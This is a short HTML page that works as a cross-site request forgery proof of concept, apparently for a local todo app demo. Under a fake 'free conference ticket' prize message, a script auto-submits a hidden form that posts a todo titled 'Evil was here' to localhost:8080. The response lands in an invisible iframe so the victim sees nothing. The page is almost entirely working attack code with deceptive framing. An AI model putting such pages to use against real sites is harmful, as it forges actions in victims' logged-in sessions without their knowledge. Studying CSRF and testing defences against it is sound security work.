<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>You won!</title>
</head>
<body>
    <h1>Congratulations, you won a free conference ticket!</h1>

    <!-- The form is sent into an invisible iframe, so the victim never sees the response -->
    <iframe name="hidden-frame" hidden></iframe>

    <form id="evil-form" action="http://localhost:8080/api/todos" method="post" target="hidden-frame">
        <input type="hidden" name="title" value="Evil was here">
    </form>

    <script>
        document.querySelector("#evil-form").submit();
    </script>
</body>
</html>
